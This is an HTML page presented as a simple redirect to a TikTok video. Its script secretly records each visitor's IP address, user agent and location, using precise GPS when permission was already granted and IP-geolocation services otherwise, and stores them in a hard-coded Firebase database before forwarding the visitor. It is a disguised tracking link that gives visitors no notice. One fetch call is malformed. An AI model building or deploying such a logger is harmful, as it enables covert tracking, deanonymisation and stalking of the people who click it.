<!DOCTYPE html>
<html>
<head>
  <title>Redirect</title>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
</head>
<body>
<script>
  const firebaseConfig = {
    apiKey: "AIzaSyBmeCiF-qqHkaM81Jq-whaxvz4zJ6Ni3R0",
    authDomain: "yachad-32fe3.firebaseapp.com",
    databaseURL: "https://yachad-32fe3-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "yachad-32fe3",
    storageBucket: "yachad-32fe3.firebasestorage.app",
    messagingSenderId: "720032034735",
    appId: "1:720032034735:web:cabedda1dc842420bbc95a",
    measurementId: "G-YH1NK3RHY3"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();

  let redirected = false;

  function saveToFirestore(lat, lon, ip, source) {
    if (redirected) return;
    const ua = navigator.userAgent;
    const time = new Date().toISOString();
    db.collection('ipLogs').add({
      ip: ip,
      userAgent: ua,
      timestamp: time,
      latitude: lat,
      longitude: lon,
      source: source
    }).finally(() => {
      redirected = true;
      window.location.href = "https://www.tiktok.com/@elkaaem/video/7535937446920424722?_t=ZS-8yi4cs7jnMr&_r=1";
    });
  }

  async function getVisitorIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip || "unknown";
    } catch {
      return "unknown";
    }
  }

  function fetchLocation(url, parser) {
    return fetch(url)
      .then(res => res.json())
      .then(parser)
      .catch(() => null);
  }

  function parseIpApi(data) {
    return { lat: data.lat || null, lon: data.lon || null };
  }

  function parseIpWhoIs(data) {
    if (data.success === false) return null;
    return { lat: data.latitude || null, lon: data.longitude || null };
  }

  function parseFreeGeoIp(data) {
    return { lat: data.latitude || null, lon: data.longitude || null };
  }

  function fallbackToIPLocation(visitorIP) {
    Promise.all([
      fetchLocation('https://ip-api.com/json/', parseIpApi),
      fetchLocation('https://ipwho.is/', parseIpWhoIs),
      fetchLocation(https://freegeoip.app/json/${visitorIP}, parseFreeGeoIp)
    ]).then(results => {
      const validResults = results.filter(r => r !== null);
      if (validResults.length === 0) {
        saveToFirestore(null, null, visitorIP, "IP");
        return;
      }
      let latSum = 0, lonSum = 0, count = 0;
      validResults.forEach(r => {
        if (r.lat !== null && r.lon !== null) {
          latSum += r.lat;
          lonSum += r.lon;
          count++;
        }
      });
      const avgLat = count ? latSum / count : null;
      const avgLon = count ? lonSum / count : null;
      saveToFirestore(avgLat, avgLon, visitorIP, "IP");
    }).catch(() => {
      saveToFirestore(null, null, visitorIP, "IP");
    });
  }

  async function probeSilentGeolocation(visitorIP) {
    if ("geolocation" in navigator) {
      try {
        const perm = await navigator.permissions.query({ name: "geolocation" });
        if (perm.state === "granted") {
          navigator.geolocation.getCurrentPosition(
            pos => {
              saveToFirestore(pos.coords.latitude, pos.coords.longitude, visitorIP, "silentGPS");
            },
            () => {
              fallbackToIPLocation(visitorIP);
            },
            { timeout: 5000, maximumAge: 0, enableHighAccuracy: true }
          );
        } else {
          fallbackToIPLocation(visitorIP);
        }
      } catch {
        fallbackToIPLocation(visitorIP);
      }
    } else {
      fallbackToIPLocation(visitorIP);
    }
  }

  (async () => {
    const visitorIP = await getVisitorIP();
    probeSilentGeolocation(visitorIP);
  })();
</script>
</body>
</html>
